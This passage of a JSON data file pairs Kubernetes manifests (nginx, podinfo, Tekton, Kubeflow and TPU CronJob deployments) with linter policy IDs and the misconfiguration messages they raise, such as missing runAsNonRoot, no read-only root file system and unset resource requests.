    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    env: dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: dev\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01333",
    "manifest_path": "data/manifests/the_stack_sample/sample_0404.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    env: dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: dev\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01334",
    "manifest_path": "data/manifests/the_stack_sample/sample_0404.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    env: dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: dev\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01335",
    "manifest_path": "data/manifests/the_stack_sample/sample_0406.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  namespace: webapp\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: frontend\n    spec:\n      serviceAccountName: webapp\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:3.3.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --level=info\n        - --backend-url=http://backend:9898/echo\n        env:\n        - name: PODINFO_UI_COLOR\n          value: 34577c\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 32Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"frontend\" does not have a read-only root file system"
  },
  {
    "id": "01336",
    "manifest_path": "data/manifests/the_stack_sample/sample_0406.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  namespace: webapp\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: frontend\n    spec:\n      serviceAccountName: webapp\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:3.3.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --level=info\n        - --backend-url=http://backend:9898/echo\n        env:\n        - name: PODINFO_UI_COLOR\n          value: 34577c\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 32Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"frontend\" is not set to runAsNonRoot"
  },
  {
    "id": "01337",
    "manifest_path": "data/manifests/the_stack_sample/sample_0413.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tekton-pipelines-webhook\n  namespace: tekton-pipelines\n  labels:\n    app.kubernetes.io/name: webhook\n    app.kubernetes.io/component: webhook\n    app.kubernetes.io/instance: default\n    app.kubernetes.io/version: v0.18.0\n    app.kubernetes.io/part-of: tekton-pipelines\n    pipeline.tekton.dev/release: v0.18.0\n    version: v0.18.0\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: webhook\n      app.kubernetes.io/component: webhook\n      app.kubernetes.io/instance: default\n      app.kubernetes.io/part-of: tekton-pipelines\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n      labels:\n        app.kubernetes.io/name: webhook\n        app.kubernetes.io/component: webhook\n        app.kubernetes.io/instance: default\n        app.kubernetes.io/version: v0.18.0\n        app.kubernetes.io/part-of: tekton-pipelines\n        pipeline.tekton.dev/release: v0.18.0\n        app: tekton-pipelines-webhook\n        version: v0.18.0\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/name: webhook\n                  app.kubernetes.io/component: webhook\n                  app.kubernetes.io/instance: default\n                  app.kubernetes.io/part-of: tekton-pipelines\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: tekton-pipelines-webhook\n      containers:\n      - name: webhook\n        image: gcr.io/tekton-releases/github.com/tektoncd/pipeline/cmd/webhook:v0.18.0@sha256:622f9d84bc56c12e883f4e5a3936d1321ed369655ea88dc8f7ab61c0108f72dd\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: CONFIG_LEADERELECTION_NAME\n          value: config-leader-election\n        - name: WEBHOOK_SERVICE_NAME\n          value: tekton-pipelines-webhook\n        - name: WEBHOOK_SECRET_NAME\n          value: webhook-certs\n        - name: METRICS_DOMAIN\n          value: tekton.dev/pipeline\n        securityContext:\n          allowPrivilegeEscalation: false\n          runAsUser: 65532\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        - name: https-webhook\n          containerPort: 8443\n        - name: probes\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable WEBHOOK_SECRET_NAME in container \"webhook\" found"
  },
  {
    "id": "01338",
    "manifest_path": "data/manifests/the_stack_sample/sample_0413.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tekton-pipelines-webhook\n  namespace: tekton-pipelines\n  labels:\n    app.kubernetes.io/name: webhook\n    app.kubernetes.io/component: webhook\n    app.kubernetes.io/instance: default\n    app.kubernetes.io/version: v0.18.0\n    app.kubernetes.io/part-of: tekton-pipelines\n    pipeline.tekton.dev/release: v0.18.0\n    version: v0.18.0\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: webhook\n      app.kubernetes.io/component: webhook\n      app.kubernetes.io/instance: default\n      app.kubernetes.io/part-of: tekton-pipelines\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n      labels:\n        app.kubernetes.io/name: webhook\n        app.kubernetes.io/component: webhook\n        app.kubernetes.io/instance: default\n        app.kubernetes.io/version: v0.18.0\n        app.kubernetes.io/part-of: tekton-pipelines\n        pipeline.tekton.dev/release: v0.18.0\n        app: tekton-pipelines-webhook\n        version: v0.18.0\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/name: webhook\n                  app.kubernetes.io/component: webhook\n                  app.kubernetes.io/instance: default\n                  app.kubernetes.io/part-of: tekton-pipelines\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: tekton-pipelines-webhook\n      containers:\n      - name: webhook\n        image: gcr.io/tekton-releases/github.com/tektoncd/pipeline/cmd/webhook:v0.18.0@sha256:622f9d84bc56c12e883f4e5a3936d1321ed369655ea88dc8f7ab61c0108f72dd\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: CONFIG_LEADERELECTION_NAME\n          value: config-leader-election\n        - name: WEBHOOK_SERVICE_NAME\n          value: tekton-pipelines-webhook\n        - name: WEBHOOK_SECRET_NAME\n          value: webhook-certs\n        - name: METRICS_DOMAIN\n          value: tekton.dev/pipeline\n        securityContext:\n          allowPrivilegeEscalation: false\n          runAsUser: 65532\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        - name: https-webhook\n          containerPort: 8443\n        - name: probes\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"webhook\" does not have a read-only root file system"
  },
  {
    "id": "01339",
    "manifest_path": "data/manifests/the_stack_sample/sample_0414.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test-deployment\n  labels:\n    app: test-deployment\nspec:\n  selector:\n    matchLabels:\n      app: test-deployment\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: test-deployment\n    spec:\n      containers:\n      - name: tester\n        image: ubuntu:latest\n        command:\n        - bash\n        - -c\n        - 'echo \"Falling asleep for $SECS_TO_SLEEP\"\n\n          sleep $SECS_TO_SLEEP\n\n          '\n        env:\n        - name: SECS_TO_SLEEP\n          value: '1000'\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"tester\" is using an invalid container image, \"ubuntu:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01340",
    "manifest_path": "data/manifests/the_stack_sample/sample_0414.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test-deployment\n  labels:\n    app: test-deployment\nspec:\n  selector:\n    matchLabels:\n      app: test-deployment\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: test-deployment\n    spec:\n      containers:\n      - name: tester\n        image: ubuntu:latest\n        command:\n        - bash\n        - -c\n        - 'echo \"Falling asleep for $SECS_TO_SLEEP\"\n\n          sleep $SECS_TO_SLEEP\n\n          '\n        env:\n        - name: SECS_TO_SLEEP\n          value: '1000'\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tester\" does not have a read-only root file system"
  },
  {
    "id": "01341",
    "manifest_path": "data/manifests/the_stack_sample/sample_0414.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test-deployment\n  labels:\n    app: test-deployment\nspec:\n  selector:\n    matchLabels:\n      app: test-deployment\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: test-deployment\n    spec:\n      containers:\n      - name: tester\n        image: ubuntu:latest\n        command:\n        - bash\n        - -c\n        - 'echo \"Falling asleep for $SECS_TO_SLEEP\"\n\n          sleep $SECS_TO_SLEEP\n\n          '\n        env:\n        - name: SECS_TO_SLEEP\n          value: '1000'\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tester\" is not set to runAsNonRoot"
  },
  {
    "id": "01342",
    "manifest_path": "data/manifests/the_stack_sample/sample_0419.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jupyter-web-app\" does not have a read-only root file system"
  },
  {
    "id": "01343",
    "manifest_path": "data/manifests/the_stack_sample/sample_0419.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jupyter-web-app\" is not set to runAsNonRoot"
  },
  {
    "id": "01344",
    "manifest_path": "data/manifests/the_stack_sample/sample_0419.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jupyter-web-app\" has cpu request 0"
  },
  {
    "id": "01345",
    "manifest_path": "data/manifests/the_stack_sample/sample_0419.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jupyter-web-app\" has memory limit 0"
  },
  {
    "id": "01346",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monitor\" does not have a read-only root file system"
  },
  {
    "id": "01347",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"publisher\" does not have a read-only root file system"
  },
  {
    "id": "01348",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              